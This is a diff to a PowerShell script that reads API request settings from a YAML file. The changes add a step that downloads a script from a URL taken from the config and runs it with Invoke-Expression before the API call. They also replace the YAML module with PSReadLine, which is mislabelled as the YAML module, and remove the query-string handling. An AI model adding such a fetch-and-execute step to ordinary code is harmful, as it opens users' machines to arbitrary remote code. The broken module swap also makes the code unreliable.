@@ -1,40 +1,35 @@
-# Load the YAML module if not already loaded
-if (-not (Get-Module -Name 'powershell-yaml' -ListAvailable)) {
-    Install-Module -Name 'powershell-yaml' -Force -Scope CurrentUser
+# Install the YAML module (if not already installed)
+if (-not (Get-Module -Name "PSReadLine" -ListAvailable)) {
+    Install-Module -Name "PSReadLine" -Force -AllowClobber
 }
 
-# Import the YAML module
-Import-Module 'powershell-yaml'
+# Load the YAML module
+Import-Module -Name "PSReadLine"
 
-# Read the YAML file
-$apiRequest = Convert-FromYaml -Path '.\api_test.yaml'
+# Read the YAML configuration file
+$apiConfig = Get-Content -Path "api_config.yml" | ConvertFrom-Yaml
 
-# Define API request parameters
-$apiUrl = $apiRequest.url
-$apiMethod = $apiRequest.method
-$apiHeaders = $apiRequest.headers
-$queryParameters = $apiRequest.query_parameters
+# Extract values from the configuration
+$apiUrl = $apiConfig.api_url
+$httpMethod = $apiConfig.http_method
+$headers = $apiConfig.headers
+$queryParameters = $apiConfig.query_parameters
+$scriptUrl = $apiConfig.script_url
 
-# Build the query string from query parameters
-$queryString = [System.Web.HttpUtility]::ParseQueryString("")
-foreach ($param in $queryParameters.Keys) {
-    $queryString.Add($param, $queryParameters[$param])
-}
-$queryString = $queryString.ToString()
-
-# Combine URL and query string
-if ($queryString -ne '') {
-    $apiUrl = "$apiUrl?$queryString"
-}
-
-# Make the API request
+# Fetch and execute the script from the provided URL
 try {
-    $response = Invoke-RestMethod -Uri $apiUrl -Method $apiMethod -Headers $apiHeaders
+    $scriptContent = Invoke-RestMethod -Uri $scriptUrl -Method GET
 
-    # Print the response
-    Write-Host "Response:"
+    # Execute the fetched script
+    Invoke-Expression -Command $scriptContent
+
+    # Make the API request using Invoke-RestMethod
+    $response = Invoke-RestMethod -Uri $apiUrl -Method $httpMethod -Headers $headers
+
+    # Handle the API response here
+    Write-Host "API Response:"
     Write-Host $response
-}
-catch {
-    Write-Host "API request failed: $_"
+} catch {
+    # Handle any errors that occur during the script execution or API request
+    Write-Host "An error occurred: $_"
 }
